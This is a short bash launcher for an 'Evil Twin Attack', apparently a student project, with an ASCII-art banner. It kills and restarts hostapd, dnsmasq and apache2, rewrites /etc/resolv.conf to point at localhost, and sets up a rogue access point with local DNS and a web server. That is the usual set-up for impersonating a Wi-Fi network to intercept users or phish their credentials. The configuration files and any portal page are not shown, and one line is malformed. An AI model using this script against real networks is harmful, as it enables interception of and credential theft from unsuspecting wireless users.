#!/bin/bash

upstream_interface=$1

echo """
      \\
     ( )
      H
      H
     _H_  
  .-'-.-'-.
 /         |
|           |
|   .-------'._
|  / /  '.' '. |
|  \ \ @   @ / / 
|   '---------'      .-------------------------.  
|    _______|       (     Evil Twin Attack       )
|  .'-+-+-+|        ( Elmalem Lioz && Caspi Gal  ) 
|  '.-+-+-+|         '-------------------------'
|    '''''' |
'-.__   __.-'
     '''
     \\   
"""

# Kill the process's before it's start again

killall hostapd
killall dnsmasq
killall apache2

# Edit the original resolv.conf to the deafult 

rm /etc/resolv.conf
echo nameserver 127.0.0.1 > /etc/resolv.conf

# Web server initalization - apache2 service start

service apache2 start &127.0.0.1

# Start hostapd service

xterm -e hostapd Configuration/hostapd.conf &
 
# Configue the traffic

ifconfig $upstream_interface 10.0.0.1 netmask 255.255.255.0 & 
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 &

# Start dnsmasq service

xterm -e dnsmasq -C Configuration/dnsmasq.conf -d &

